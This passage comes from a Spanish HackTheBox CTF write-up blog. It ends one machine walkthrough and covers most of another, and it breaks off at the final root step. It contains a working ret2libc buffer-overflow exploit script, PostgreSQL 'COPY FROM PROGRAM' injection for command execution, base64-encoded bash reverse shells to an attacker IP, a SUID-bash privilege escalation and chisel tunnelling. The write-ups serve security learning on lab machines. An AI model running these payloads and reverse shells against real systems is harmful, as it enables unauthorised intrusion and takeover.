ESI: 0x56555d30 (\u0026lt;__libc_csu_init\u0026gt;:\tpush ebp) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41414141 (\u0026#39;AAAA\u0026#39;) ESP: 0xffffcf80 --\u0026gt; 0x0 EIP: 0x42424242 (\u0026#39;BBBB\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) Efectivamente, ha funcionado, el EIP vale ‘BBBB’. Esto significa que ya tenemos la capacidad de poder manipular el EIP.\nEl siguiente paso sería ver las protecciones\nProteciones ASLR: Aleatorización de las direcciones de la memoria. Esta protección no es del programa en sí, es una protección del sistema. En los sistemas actuales suele ser raro encontrarlo deshabilitado. Para ver si está habilitado le hacemos un cat al /proc/sys/kernel/randomize_va_space. Si el contenido es un 0, es que está deshabilitado, si no devuelve un 0 es que esta habilitado\nww-data@enterprise:/var/www/html/files$ cat /proc/sys/kernel/randomize_va_space 0 Otra forma de comprobar si el ASLR está habilitado, sería haciendo un bucle buscando la dirección de la librería libc y ver si la dirección cambia\nwww-data@enterprise:/bin$ for i in `seq 0 20`; do ldd lcars | grep libc; done libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e32000) Como podemos ver, no cambia\nVamos a comprobar más protecciones con checksec.\nchecksec lcars [*] \u0026#39;/home/d3b0o/Desktop/enterprise/lcars\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments NX está deshabilitado así que podríamos crear un shellcode y ponerlo en la pila para después llamarlo desde el EIP, pero un ret2libc es más sencillo.\nEsquema sacado de (https://bufferoverflows.net/ret2libc-exploitation-example/)\nPara llevar a cabo el ret2libc necesitamos la dirección de system, /bin/sh y de forma opcional exit. Estas direcciones las podemos encontrar de distintas formas.\nComo la máquina tiene gdb, podemos buscar las direcciones con gdb.\nwww-data@enterprise:/bin$ gdb ./lcars -q (gdb) b *main Breakpoint 1 at 0xc91 (gdb) r Starting program: /bin/lcars Breakpoint 1, 0x56555c91 in main () (gdb) p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e4c060 \u0026lt;system\u0026gt; (gdb) p exit $2 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e3faf0 \u0026lt;exit\u0026gt; (gdb) find \u0026amp;system,+9999999,\u0026#34;/bin/sh\u0026#34; 0xf7f70a0f En el caso de que no tengamos gdb, podemos usar los siguientes comandos, pero para esta máquina no nos sirven porque no tiene el comando strings.\n#/bin/sh strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh #system readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system #exit readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit Exploit –\u0026gt; p32812 Ahora ya podemos hacer el exploit. Primero de todo creamos las variables con las direcciones que hemos sacado, creamos una variable con la cantidad de caracteres que vamos a necesitar para llegar al EIP, Después lo juntamos todo, en el orden mencionado anteriormente y lo mandamos por el puerto el cual reporto nmap que estaba abierto y tenía este binario corriendo. Por último, nos spwaneamos una shell interactiva.\nfrom pwn import * offset = 212 junk = b\u0026#34;A\u0026#34; * offset system = p32(0xf7e4c060) exit = p32(0xf7e3faf0) sh = p32(0xf7f6ddd5) payload = junk + system + exit + sh host, port = \u0026#34;10.10.10.61\u0026#34;, 32812 r = remote(host, port) r.recvuntil(b\u0026#34;Enter Bridge Access Code:\u0026#34;) r.sendline(b\u0026#34;picarda1\u0026#34;) r.recvuntil(b\u0026#34;Waiting for input:\u0026#34;) r.sendline(b\u0026#34;4\u0026#34;) r.recvuntil(b\u0026#34;Enter Security Override\u0026#34;) r.sendline(payload) r.interactive() ¡Al ejecutarlo, ya somos root!\n\u0026gt; python3 main.py [+] Opening connection to 10.10.10.61 on port 32812: Done [*] Switching to interactive mode : $ whoami root $ ","date":"2023-11-11","id":60,"permalink":"/writeups/hackthebox/enterprise/","summary":"En este writeup vamos a estar resolviendo la máquina Enterprise de la plataforma de HackTheBox, Es una máquina medium muy interesante, Vamos a estar tocando enumeración web de Wordpress y Joomla, SQL injections, Vamos a escapar de un docker y por último vamos a explotar un Buffer overflow muy interesante con la técnica ret2libc","tags":["CTF","RCE","SQLI","Cron","Port forwarding","Python","BoF","ret2libc"],"title":"Enterprise"},{"content":"","date":"2023-11-11","id":61,"permalink":"/tags/port-forwarding/","summary":"","tags":[],"title":"Port forwarding"},{"content":"","date":"2023-11-11","id":62,"permalink":"/tags/python/","summary":"","tags":[],"title":"python"},{"content":"","date":"2023-11-11","id":63,"permalink":"/tags/rce/","summary":"","tags":[],"title":"RCE"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.11.216 PING 10.10.11.216 (10.10.11.216) 56(84) bytes of data. 64 bytes from 10.10.11.216: icmp_seq=1 ttl=63 time=174 ms --- 10.10.11.216 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 174.469/174.469/174.469/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.216 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\nextractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.11.216 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\nnmap -p22,80 -sCV 10.10.11.216 -oN versions Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 17:21 CET Nmap scan report for 10.10.11.216 Host is up (0.099s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA) |_ 256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://jupiter.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos HTTP El nmap reporto que el puerto 80 estaba abierto y que no se hacía el redirect a jupiter.htb. Esto significa que el servidor puede estar usando virtual hosting\nQué es virtual hosting?\rEl virtualhost, o servidor virtual, es una forma de alojamiento web que permite que varias páginas web puedan funcionar en una misma máquina. Hay dos tipos de virtualhost:\nLos que se basan en direcciones IP, donde cada página web tendrá una IP diferente. Los que se basan en nombres de dominio, donde una sola dirección IP funcionan varias páginas web. Definición sacada de: https://linube.com/ayuda/articulo/267/que-es-un-virtualhost\nhttp-title: Did not follow redirect to http://jupiter.htb/ Para solucionar esto hay que añadir en el /etc/hosts la siguiente línea:\n10.10.11.216 jupiter.htb Con esto estamos diciendo que el dominio jupiter.htb hace referencia a la ip 10.10.11.216. Ahora ya podemos acceder a la web desde el navegador. La web no tiene nada interesante, asi que vamos a buscar subdominios, para ello podemos usar muchas herramientas, pero voy a usar wfuzz\nwfuzz -c -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.jupiter.htb\u0026#34; http://jupiter.htb/ Explicación parámetros\r-c: Mostrar el resultado con colores -t: Definir el tiempo del escaneo -w: Diccionario -H: Especificar un header FUZZ: Es donde va a ir probando el contenido del diccionario Este comando nos muestra muchos subdominios, pero todos tienen código 301, 178 caracteres, 12 palabras y 7 líneas\n===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 7 L 12 W 178 Ch \u0026#34;www\u0026#34; 000000045: 301 7 L 12 W 178 Ch \u0026#34;www1\u0026#34; 000000042: 301 7 L 12 W 178 Ch \u0026#34;static\u0026#34; 000000015: 301 7 L 12 W 178 Ch \u0026#34;ns\u0026#34; 000000003: 301 7 L 12 W 178 Ch \u0026#34;ftp\u0026#34; 000000031: 301 7 L 12 W 178 Ch \u0026#34;mobile\u0026#34; 000000044: 301 7 L 12 W 178 Ch \u0026#34;web\u0026#34; 000000046: 301 7 L 12 W 178 Ch \u0026#34;img\u0026#34; 000000041: 301 7 L 12 W 178 Ch \u0026#34;dns1\u0026#34; 000000043: 301 7 L 12 W 178 Ch \u0026#34;lists\u0026#34; 000000040: 301 7 L 12 W 178 Ch \u0026#34;ns4\u0026#34; 000000007: 301 7 L 12 W 178 Ch \u0026#34;webdisk\u0026#34; 000000039: 301 7 L 12 W 178 Ch \u0026#34;dns2\u0026#34; ... Lo que podemos hacer es añadir el parámetro -hh=178 para ocultar las respuestas con 178 caracteres.\nwfuzz -c -t 20 --hh=178 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.jupiter.htb\u0026#34; http://jupiter.htb/ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001955: 200 211 L 798 W 34390 Ch \u0026#34;kiosk\u0026#34; Ahora ya nos reporta un subdominio, kiosk, para poder verlo tenemos que añadirlo en el /etc/hosts de la siguiente forma\n10.10.11.216 jupiter.htb kiosk.jupiter.htb Al entrar a kiosk.jupiter.htb, vemos una web hecha con Grafana, concretamente si nos vamos al login vemos que es un grafana v9.5.2.\nEn la página principal, si nos vamos a cualquier apartado y le damos a los 3 puntos \u0026gt; inspeccionar \u0026gt; Panel JSON, vemos lo siguiente:\n{ \u0026#34;datasource\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34; }, \u0026#34;fieldConfig\u0026#34;: { \u0026#34;defaults\u0026#34;: { \u0026#34;mappings\u0026#34;: [], \u0026#34;thresholds\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;percentage\u0026#34;, \u0026#34;steps\u0026#34;: [ { \u0026#34;color\u0026#34;: \u0026#34;green\u0026#34;, \u0026#34;value\u0026#34;: null }, { \u0026#34;color\u0026#34;: \u0026#34;orange\u0026#34;, \u0026#34;value\u0026#34;: 70 }, { \u0026#34;color\u0026#34;: \u0026#34;red\u0026#34;, \u0026#34;value\u0026#34;: 85 } ] }, \u0026#34;color\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;thresholds\u0026#34; } }, \u0026#34;overrides\u0026#34;: [] }, \u0026#34;gridPos\u0026#34;: { \u0026#34;h\u0026#34;: 8, \u0026#34;w\u0026#34;: 12, \u0026#34;x\u0026#34;: 0, \u0026#34;y\u0026#34;: 24 }, \u0026#34;id\u0026#34;: 30, \u0026#34;options\u0026#34;: { \u0026#34;reduceOptions\u0026#34;: { \u0026#34;values\u0026#34;: false, \u0026#34;calcs\u0026#34;: [ \u0026#34;lastNotNull\u0026#34; ], \u0026#34;fields\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;orientation\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;textMode\u0026#34;: \u0026#34;auto\u0026#34;, \u0026#34;colorMode\u0026#34;: \u0026#34;value\u0026#34;, \u0026#34;graphMode\u0026#34;: \u0026#34;area\u0026#34;, \u0026#34;justifyMode\u0026#34;: \u0026#34;auto\u0026#34; }, \u0026#34;pluginVersion\u0026#34;: \u0026#34;9.5.2\u0026#34;, \u0026#34;targets\u0026#34;: [ { \u0026#34;datasource\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34; }, \u0026#34;editorMode\u0026#34;: \u0026#34;code\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;table\u0026#34;, \u0026#34;hide\u0026#34;: false, \u0026#34;rawQuery\u0026#34;: true, \u0026#34;rawSql\u0026#34;: \u0026#34;select \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;;\u0026#34;, \u0026#34;refId\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;sql\u0026#34;: { \u0026#34;columns\u0026#34;: [ { \u0026#34;parameters\u0026#34;: [], \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34; } ], \u0026#34;groupBy\u0026#34;: [ { \u0026#34;property\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34; }, \u0026#34;type\u0026#34;: \u0026#34;groupBy\u0026#34; } ], \u0026#34;limit\u0026#34;: 50 } } ], \u0026#34;title\u0026#34;: \u0026#34;Number of Moons\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;stat\u0026#34; } Teniendo esto, nos podemos fijar en que la base de datos es postgres y que se está haciendo una petición a la base de datos:\nselect \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;; Si volvemos a la página principal y hacemos ctrl + shift + c y vamos al apartado Red podemos ver que a medida que vamos scroleando se van haciendo peticiones. Vamos a interceptarlas con burpsuite.\nPOST /api/ds/query HTTP/1.1 Host: kiosk.jupiter.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: application/json, text/plain, */* Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1\u0026amp;refresh=1d ... {\u0026#34;queries\u0026#34;:[{\u0026#34;refId\u0026#34;:\u0026#34;A\u0026#34;,\u0026#34;datasource\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;postgres\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;YItSLg-Vz\u0026#34;},\u0026#34;rawSql\u0026#34;:\u0026#34;select \\n count(parent) \\nfrom \\n moons \\nwhere \\n parent = \u0026#39;Jupiter\u0026#39;;\u0026#34;,\u0026#34;format\u0026#34;:\u0026#34;table\u0026#34;,\u0026#34;datasourceId\u0026#34;:1,\u0026#34;intervalMs\u0026#34;:60000,\u0026#34;maxDataPoints\u0026#34;:928}],\u0026#34;range\u0026#34;:{\u0026#34;from\u0026#34;:\u0026#34;2023-11-01T11:31:09.304Z\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;2023-11-01T17:31:09.304Z\u0026#34;,\u0026#34;raw\u0026#34;:{\u0026#34;from\u0026#34;:\u0026#34;now-6h\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;now\u0026#34;}},\u0026#34;from\u0026#34;:\u0026#34;1698838269304\u0026#34;,\u0026#34;to\u0026#34;:\u0026#34;1698859869304\u0026#34;} En la petición interceptada podemos ver la petición que se está haciendo a la base de datos Postgres\nIntrusión Para saber como hacer una inyección a un PostgreSQL existe un recurso muy interesante de la repo de Payloads All The Things, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyección sql a un rce (Remote Code Execution)\nBásicamente, consiste en crear una tabla en la base de datos en uso por la web\nCREATE TABLE cmd_exec(cmd_output text); Mediante COPY se pondrá en la tabla el resultado del comando id, lo que provocará que se ejecute el comando ìd\nCOPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;; De forma opcional, en el caso de que podamos ver el output lo podríamos ver simplemente haciendo una petición a la tabla cmd_exec\nSELECT * FROM cmd_exec; Sabiendo esto vamos con la explotación:\nCreamos la tabla cmd_exec\n\u0026#34;rawSql\u0026#34;:\u0026#34;CREATE TABLE cmd_exec(cmd_output text);\u0026#34; Ahora nos ponemos en escucha por la interfaz tun0 a la espera de paquetes icmp que son los que usa ping.\nsudo tcpdump -i tun0 icmp Por último mandamos la inyección para ejecutar un ping a nuestra máquina\n\u0026#34;rawSql\u0026#34;:\u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;ping -c 1 10.10.14.28\u0026#39;;\u0026#34; El servidor nos responde con un status 200\n{\u0026#34;results\u0026#34;:{\u0026#34;A\u0026#34;:{\u0026#34;status\u0026#34;:200,\u0026#34;frames\u0026#34;:[]}}} Y vemos que se ha hecho el ping correctamente, lo que significa que tenemos capacidad de ejecutar comandos en la máquina víctima\n18:47:24.492218 IP jupiter.htb \u0026gt; 10.10.14.28: ICMP echo request, id 2, seq 1, length 64 18:47:24.492238 IP 10.10.14.28 \u0026gt; jupiter.htb: ICMP echo reply, id 2, seq 1, length 64 Reverse shell Vamos a ponernos en escucha con netcat por el puerto 443\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha La revershell la vamos a mandar con bash: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1, pero lo pondremos dentro de bash -c \u0026quot;bash- i...\u0026quot; porque puede ser que la normal la bloquee la máquina víctima. En resumen quedará así:\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34; Antes de aplicarlo a la inyección vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | base64 El comando final que tendremos que poner en la inyección seria, primero un echo con el base64, después un base64 -d para decodear el base64 y por último bash para que el resultado del base64 lo ejecute con bash.\necho YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash Esto aplicado a la inyección quedaría de la siguiente forma:\n\u0026#34;rawSql\u0026#34;:\u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash\u0026#39;;\u0026#34; ¡Recibimos la conexión!\n$ nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.28] from (UNKNOWN) [10.10.11.216] 46594 bash: cannot set terminal process group (18744): Inappropriate ioctl for device bash: no job control in this shell postgres@jupiter:/var/lib/postgresql/14/main$ Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Escalada de privilegios Con un ifconfig podemos comprobar que estamos en la máquina víctima y no en ningún contenedor\npostgres@jupiter:/var/lib/postgresql/14/main$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.10.11.216 netmask 255.255.254.0 broadcast 10.10.11.255 ... Sabiendo que la web era un grafana, existe un archivo interesante, el cual puede contener credenciales e información de valor que está en /etc/grafana/grafana.ini, pero no tenemos permisos para verlo\npostgres@jupiter:/etc/grafana$ cat grafana.ini cat: grafana.ini: Permission denied juno Vamos a investigar si hay alguna tarea cron ejecutándose cada \u0026lsquo;x\u0026rsquo; tiempo, para ello vamos a usar pspy. Para usarlo simple nos lo descargamos en nuestra máquina, nos montamos un servidor con python en el directorio en el que esté guardado\npython3 -m http.server Y nos lo descargamos en la máquina víctima en el directorio /tmp\nwget 10.10.14.28/pspy64 Por último le damos permisos de ejecución y lo ejecutamos\nchmod +x pspy64 ./pspy64 Después de un rato capturando procesos vemos un script ubicado en /home/juno/shadow-simulation.sh el cual se esta ejecutando con bash. También se está ejecutando /home/juno/.local/bin/shadow pasandole el archivo /dev/shm/network-simulation.yml\n2023/11/01 18:52:01 CMD: UID=1000 PID=21187 | /bin/bash /home/juno/shadow-simulation.sh 2023/11/01 18:52:01 CMD: UID=1000 PID=21186 | /bin/sh -c /home/juno/shadow-simulation.sh 2023/11/01 18:52:01 CMD: UID=1000 PID=21189 | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 2023/11/01 18:52:01 CMD: UID=1000 PID=21198 | /usr/bin/python3 -m http.server 80 2023/11/01 18:52:01 CMD: UID=1000 PID=21199 | /usr/bin/curl -s server No tenemos acceso a /home/juno por lo que no podemos ver el script shadow-simulation.sh, pero sí tenemos acceso a /dev/shm. Si hacemos un cat al /dev/shm/network-simulation.yml podemos ver lo siguiente:\ngeneral: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s Si nos fijamos, hay dos comandos que se están ejecutando python3 -m http.server 80 y curl -s server los cuales en el pspy salía que se ejecutaban después del /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml\n2023/11/01 18:52:01 CMD: UID=1000 PID=21198 | /usr/bin/python3 -m http.server 80 2023/11/01 18:52:01 CMD: UID=1000 PID=21199 | /usr/bin/curl -s server Con un ls -l vemos que tenemos permisos de escritura y lectura en el /dev/shm/network-simulation.yml\n$ls -l /dev/shm/network-simulation.yml -rw-rw-rw- 1 juno juno 815 Mar 7 2023 /dev/shm/network-simulation.yml Así que vamos a modificarlo\u0026hellip;\nVamos a hacer que haga una copia de /bin/bash en /tmp/bash y le dé permisos suid\nhosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/bash start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/chmod args: u+s /tmp/bash start_time: 5s Ahora solo falta esperar a que se ejecute y ejecutar /tmp/bash -p para ejecutar la bash con privilegios\npostgres@jupiter:/tmp$ /tmp/bash -p bash-5.1$ whoami juno jovian Pasa una cosa rara y es que somos juno, pero algunos comandos se ejecutan como postgres como en este caso ìd\nbash-5.1$ whoami juno bash-5.1$ id uid=114(postgres) gid=120(postgres) euid=1000(juno) groups=120(postgres),119(ssl-cert) Para solucionar esto vamos a conectarnos por ssh, primero en la máquina atacante vamos a crear las llaves ssh con ssh-keygen. Esto nos creará una carpeta en nuestro directorio llamada .ssh, dentro habrá un archivo llamado id_rsa.pub que será nuestra llave pública, esta llave vamos a tener que ponerla en /home/juno/authorized_keys. Ahora ya nos podemos conectar por ssh sin necesidad de especificar contraseñas\nssh juno@10.10.11.216 Ahora que ya tenemos una consola en condiciones, vamos a hacer un id para ver en que grupos estamos\nuid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science) Hay un grupo que llama la atención, science. Podemos buscar que archivos pertenecen a este grupo con el siguiente comando\nfind / -group science 2\u0026gt;/dev/null /opt/solar-flares /opt/solar-flares/flares.csv /opt/solar-flares/xflares.csv /opt/solar-flares/map.jpg /opt/solar-flares/start.sh /opt/solar-flares/logs /opt/solar-flares/logs/jupyter-2023-03-10-25.log /opt/solar-flares/logs/jupyter-2023-03-08-37.log /opt/solar-flares/logs/jupyter-2023-03-08-38.log /opt/solar-flares/logs/jupyter-2023-03-08-36.log /opt/solar-flares/logs/jupyter-2023-03-09-11.log /opt/solar-flares/logs/jupyter-2023-03-09-24.log /opt/solar-flares/logs/jupyter-2023-03-08-14.log /opt/solar-flares/logs/jupyter-2023-03-09-59.log /opt/solar-flares/flares.html /opt/solar-flares/cflares.csv /opt/solar-flares/flares.ipynb /opt/solar-flares/.ipynb_checkpoints /opt/solar-flares/mflares.csv El find reporta que en el /opt hay muchos archivos del grupo science.\nSi vamos al /opt/solar-flares/logs, hay muchos archivos de logs, al hacer un cat al más reciente se ve lo siguiente\njuno@jupiter:/opt/solar-flares/logs$ cat jupyter-2023-11-01-22.log ..... [I 19:22:56.926 NotebookApp] http://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 [I 19:22:56.927 NotebookApp] or http://127.0.0.1:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 ..... Vemos que hay una web en la máquina víctima por el puerto 8888, pero ese puerto no lo reporto nmap, eso es porque seguramente este puerto solo se puede ver desde la máquina víctima. Para ver más información de los puertos podemos usar ss -tnlp\njuno@jupiter:/opt/solar-flares/logs$ ss -tnlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 511 0.0.0.0:80 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* LISTEN 0 128 127.0.0.1:8888 0.0.0.0:* LISTEN 0 244 127.0.0.1:5432 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* Si queremos ver este puerto desde nuestra máquina podemos hacer port forwarding, podríamos usar ssh, pero no me apetece así que vamos a usar chisel.\nUsarlo es muy sencillo, simplemente nos lo descargamos en nuestra máquina, lo pasamos a la máquina víctima con un servidor con python como hicimos con pspy anteriormente (python3 -m http.server 80), le damos permisos de ejecución (chmod +x chisel) y ejecutamos lo siguiente\nMáquina atacante:\nsudo ./chisel server --reverse -p 1234 Máquina víctima:\n./chisel client 10.10.14.28:443 R:8888:127.0.0.1:8888 \u0026amp; Ahora nuestro puerto 8888 equivale al puerto 8888 de la máquina víctima, con esto completado ya podemos entrar al link que veíamos en los logs\nhttp://localhost:8888/?token=a36adfafb8a4239c215350cad2e1cc07696168a8e4fa6093 Una vez dentro vemos varios archivos los cuales podemos modificar, por lo que podemos intuir que esta web está siendo ejecutada por root o por jovian. Si vamos a flares.ipynb vemos un archivo que parece tener una documentación de python y arriba hay un botón que pone run y tenemos capacidad para modificar el archivo así que se puede intentar un rce.\nimport os os.system(\u0026#39;whoami\u0026#39;) jovian Pues tenemos un rce y ya sabemos quién estaba ejecutando esto: jovian\nPara conseguir una reverse shell vamos a usar lo mismo que usamos al principio, así que no lo voy a voler a explicar para no alargar el post\nimport os os.system(\u0026#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK | base64 -d | bash\u0026#39;) Ya somos jovian!\n$ nc -nlvp 443 listening on [any] 443 ... jovian@jupiter:/opt/solar-flares$ root Con un sudo -l vemos que podemos ejecutar como root sin la necesidad de proporcionar contraseña el archivo /usr/local/bin/sattrack\n$ sudo -l User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack Al ejecutarlo nos sale que no ha encontrado el archivo de configuración\njovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack sudo 